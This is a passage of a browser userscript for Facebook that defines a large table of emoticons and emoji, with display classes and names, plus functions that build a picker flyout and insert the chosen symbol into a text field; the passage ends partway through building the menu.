// ==UserScript==
// @name            Cài Đặt ICON Trực Tiếp Trên FaceBook
// @description     All about facebook
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
